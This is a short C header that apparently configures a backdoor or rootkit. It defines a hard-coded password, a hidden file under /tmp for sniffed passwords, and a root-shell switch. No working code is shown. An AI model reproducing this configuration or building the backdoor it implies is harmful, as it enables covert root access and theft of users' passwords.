#ifndef CONFIG_H
#define CONFIG_H

#define PASSWORD "t57root"
#define PWD_SNIFF_FILE "/tmp/.web_sniff"
#define ROOTSHELL


#endif
